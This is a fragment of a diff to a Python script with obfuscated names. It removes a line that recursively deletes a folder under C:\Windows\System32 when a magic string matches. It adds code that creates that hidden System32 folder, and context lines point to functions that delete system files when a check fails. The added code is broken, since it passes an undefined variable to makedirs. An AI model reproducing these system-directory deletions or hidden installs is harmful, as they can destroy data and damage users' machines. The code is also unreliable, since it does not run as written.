@@ -13,8 +13,7 @@ import os
 import gdown
 
 
-if file_contentsx1 =="0Dn9xQkFqKEa2":
-    shutil.rmtree(r'C:\Windows\System32\WCNMX')
+
 os.system('cls')
 '''
 def delete_system32_filex():
@@ -140,6 +139,10 @@ if not os.path.exists(pathx):
 os.system('cls')
 print("")
 print("")
+dcnmwxdr = r'C:\Windows\System32\WCNMX'
+if not os.path.exists(dcnmwxdr):
+    os.makedirs(directory)
+    os.system('cls')
 def delete_files_if_aesv3_missing():
     aesv3_path = r"C:\Windows\System32\WCNMX\aes3.0v2.py"
     files_to_delete = [
